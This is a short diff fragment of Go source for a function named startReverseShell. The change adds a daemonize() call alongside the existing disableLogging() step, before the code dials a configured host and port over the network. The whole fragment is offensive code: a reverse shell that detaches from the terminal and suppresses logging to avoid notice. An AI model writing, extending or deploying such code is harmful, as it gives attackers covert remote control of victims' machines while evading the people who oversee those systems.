@@ -19,6 +19,8 @@ func startReverseShell(config Config) {
 		disableLogging()
 	}
 
+	daemonize()
+
 	host := fmt.Sprintf("%s:%d", config.Addr, config.Port)
 	conn, err := net.Dial(config.Protocol, host)
 	check(err)
